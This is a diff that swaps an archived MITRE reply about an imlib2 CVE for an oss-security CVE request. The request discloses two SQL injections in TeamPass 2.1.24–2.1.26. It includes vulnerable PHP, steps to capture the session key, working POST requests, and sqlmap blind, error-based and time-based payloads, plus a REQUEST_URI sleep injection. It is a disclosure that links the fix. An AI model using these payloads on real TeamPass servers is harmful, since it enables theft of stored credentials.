@@ -1,49 +1,152 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/10/3
-Message-Id: <20160410142423.B8E2B6C02B9@smtpvmsrv1.mitre.org>
-Date: Sun, 10 Apr 2016 10:24:23 -0400 (EDT)
-From: cve-assign@...re.org
-To: matthias@...lons.info
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: CVE request: imlib2 - off-by-one OOB read in __imlib_MergeUpdate()
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/11/1
+Message-ID: <CAAjTPb_5q38hwdLzjNP+ejfhLvpNP7ny_tzCGF9diJf1zh1Pxw@mail.gmail.com>
+Date: Mon, 11 Jul 2016 11:14:02 +0800
+From: das das <scusec2010@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE request:SQL injections in TeamPass
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hello,
 
-> https://git.enlightenment.org/legacy/imlib2.git/commit/?id=ce94edca1ccfbe314cb7cd9453433fad404ec7ef
-> 
-> -  (T(xx, y).used & T_USED) && (xx < tw); xx++, ww++);
-> +  (xx < tw) && (T(xx, y).used & T_USED); xx++, ww++);
+I'd like to request CVE IDs for these issues. They were found in
+TeamPass(www.teampass.net).
+All the issues are found in TeamPass (2.1.26, 2.1.25, 2.1.24).
+fixed:https://github.com/nilsteampassnet/TeamPass/commit/7bf6c63c4727a6ba9d65610e59ccbc25527a6fca
+
+Issues detail:
+#1: SQL injection vectors in sources/items.queries.php
+
+-------------------------code_start TeamPass-2.1.26-------------------------
+case "send_email":
+            if ($_POST['key'] != $_SESSION['key']) {
+                echo '[{"error" : "something_wrong"}]';
+                break;
+            } else {
+                if (!empty($_POST['content'])) {
+                    $content = explode(',', $_POST['content']);
+                }
+                // get links url
+                if (empty($_SESSION['settings']['email_server_url'])) {
+                    $_SESSION['settings']['email_server_url'] =
+$_SESSION['settings']['cpassman_url'];
+                }
+                if ($_POST['cat'] == "request_access_to_author") {
+                    $dataAuthor = DB::queryfirstrow("SELECT
+email,login FROM ".prefix_table("users")." WHERE id= ".$content[1]);
+                    $dataItem = DB::queryfirstrow("SELECT label FROM
+".prefix_table("items")." WHERE id= ".$content[0]);
+                    $ret = @sendEmail(
+                        $LANG['email_request_access_subject'],
+                        str_replace(array('#tp_item_author#',
+'#tp_user#', '#tp_item#'), array(" ".addslashes($dataAuthor['login']),
+addslashes($_SESSION['login']), addslashes($dataItem['label'])),
+$LANG['email_request_access_mail']),
+                        $dataAuthor['email']
+                    );
+                } elseif ($_POST['cat'] == "share_this_item") {
+                    $dataItem = DB::queryfirstrow("SELECT
+label,id_tree FROM ".prefix_table("items")." WHERE id=
+".$_POST['id']);
+                    // send email
+                    $ret = @sendEmail(
+                        $LANG['email_share_item_subject'],
+                        str_replace(
+                            array('#tp_link#', '#tp_user#', '#tp_item#'),
+
+array($_SESSION['settings']['email_server_url'].'/index.php?page=items&group='.$dataItem['id_tree'].'&id='.$_POST['id'],
+addslashes($_SESSION['login']), addslashes($dataItem['label'])),
+                            $LANG['email_share_item_mail']
+                        ),
+                        $_POST['receipt']
+                    );
+                }
+                echo '[{'.$ret.'}]';
+            }
+            break;
+-------------------------code_end TeamPass-2.1.26--------------------------
+
+In the "send_email" request, when the condition "$_POST['cat'] ==
+"share_this_item"" is successful, the POST parameter "id" is unescaped
+which leads to sql injection. while is checks the sessions at the
+beginning of the script and needs the authority of normal user to
+access to the page. To execute the SQL query,it verifies that if the
+the post parameter'key' equals session['key'].We can get the key
+through thisway：refresh the page(e.g index.php?page=items), capture
+the packet using tools (e.g Burp Suit), and forward the packet,then we
+canget the value of session 'key' in the request body.
+e.p
+http://localhost:8088/code_audit/TeamPass/sources/items.queries.php
+POST:
+type=send_email&key=wiesu2Gae8shaeNgeengeiha2aic2ohghainia1laeyi9doh6G&cat=share_this_item&id=1*
+Sqlmap payload:
+sqlmap identified the following injection point(s) with a total of 406
+HTTP(s) requests:
+---
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY
+or GROUP BY clause
+    Payload: type=send_email&key=wiesu2Gae8shaeNgeengeiha2aic2ohghainia1laeyi9doh6G&cat=share_this_item&id=1
+RLIKE (SELECT (CASE WHEN (7565=7565) THEN 1 ELSE 0x28 END))
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or
+GROUP BY clause (EXTRACTVALUE)
+    Payload: type=send_email&key=wiesu2Gae8shaeNgeengeiha2aic2ohghainia1laeyi9doh6G&cat=share_this_item&id=1
+AND EXTRACTVALUE(4196,CONCAT(0x5c,0x7162766271,(SELECT
+(ELT(4196=4196,1))),0x716b706271))
+
+    Type: AND/OR time-based blind
+    Title: MySQL <= 5.0.11 AND time-based blind (heavy query)
+    Payload: type=send_email&key=wiesu2Gae8shaeNgeengeiha2aic2ohghainia1laeyi9doh6G&cat=share_this_item&id=1
+AND 7783=BENCHMARK(5000000,MD5(0x44794d4a))
+---
 
 
-> https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=819818
+#2: SQL injection vectors in
+includes/libraries/Database/Meekrodb/db.class.php
 
-> Invalid read of size 1
-> T(xx, y) addresses one byte out of buffer
-> off-by-one error due to swapped condition order
+-------------------------code_start TeamPass-2.1.26-------------------------
+// ----- BEGIN ERROR HANDLING
+    if (!$sql || $db->error) {
+      if ($this->error_handler) {
+        $db_error = $db->error;
+        $db_errno = $db->errno;
+$db->query(
+"INSERT INTO ".$GLOBALS['pre']."log_system SET
+date=".time().",
+qui=".$_SESSION['user_id'].",
+label='Query: ".addslashes($sql)."<br />Error:
+".addslashes($db_error)."<br />@ ".$_SERVER['REQUEST_URI']."',
+type='error'",
+MYSQLI_USE_RESULT
+);
+-------------------------code_end TeamPass-2.1.26--------------------------
+When a database error occurs, these codes above will be excuted.
+However, the variable "$_SERVER['REQUEST_URI']" is unescaped and
+controled by us which lead to a sql injection. First we need to find a
+place where database error occurs, such as
+"sources/import.queries.php". It needs a normal user authority to
+access to the page. Then use the burpsuit to access the page to avoid
+the urlencode by browsers.
+e.p
+http://localhost:8088/TeamPass/sources/import.queries.php?'or/**/sleep(5)/**/or'1
+POST:
+type=import_items&data=&folder=1
+And the sql log is as below. It is a time-based sql injection.
+-------------------------log_start-------------------------
+Query INSERT INTO teampass_log_system SET
+date=1466674179,
+qui=10000001,
+label='Query: INSERT INTO `teampass_items`
+(`label`,`description`,`pw`,`pw_iv`,`url`,`id_tree`,`login`,`anyone_can_modify`)
+VALUES (\'\', NULL, \'\', \'dfd7c5279cdd697c08b627aeaaf15999\', NULL,
+\'1\', NULL, 0)<br />Error: Column \'description\' cannot be null<br
+/>@ /code_audit/TeamPass/sources/import.queries.php?'or/**/sleep(5)/**/or'1',
+type='error'
+-------------------------log_end---------------------------
 
-Use CVE-2016-3993.
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBCAAGBQJXCl7GAAoJEL54rhJi8gl59FEQAMW3yzAq1QQQYjdy7XOAw2Nf
-fSE86f1yzJY+cfK0k1107Rdva4b9AJ+qT6xw8a7Jn/HFIe7DHBgU+Vx6jO8AKKEI
-ugr1KRfuDHWslYS2naZTX9Y2RCfpL82rBET6ZfUFa6uUvN44Ns5fzVhzYtwxemps
-FuMYcVh/WUFBHaCi2kXHCzdGkCpV/d7bQ2YHeysMP/z2VKtglxXzyjOBnHaeERaM
-T+lUExknVIjPioH1M2sdFF2kxsTZx80/vJUS7EuIc5bbj5X6N0aWuJvWjB/N5isb
-eKvZ5RjNdlCCdCuCDxxj+VyCwi8gb0OY75IjIIS8Qm119OwFRts1UnrYI0hYfAnH
-R1I8KAmDOMLfsVgUYHlDqXL2c4IbDE4ZvYbZPKWRWo3FhKQHy9lLrjAt6lryWZWG
-3V13Pcf09x+zPhD0U3I0neiJDLUfI7QKztRhujjzhgbQsdv6dS0JFMQZ+Ebr0X1T
-AAVsp5WYJtwLM78QgMahlyqoVrPVtu2UBJ+iJ0hTA4OnyVqMFFwKajGV0LqIRrkJ
-oz08H2e2PrB+YjhLp3RHZPL7TejBsv1DAsU1RT63Lt1W0Lsxc+ho0tzNS+E+lLKZ
-K9cXJ7pdD5NsVj6hQu0+h2B76tRLLSfvt8TQo8UHecvFQ5MvujpIAtsM6AXLh1/X
-Ws91LdqvbB3pCAf2I2Vx
-=U68g
------END PGP SIGNATURE-----
+These issues were discovered by wps2015[D.A.S] of Information Security
+Institute @ Sichuan University.
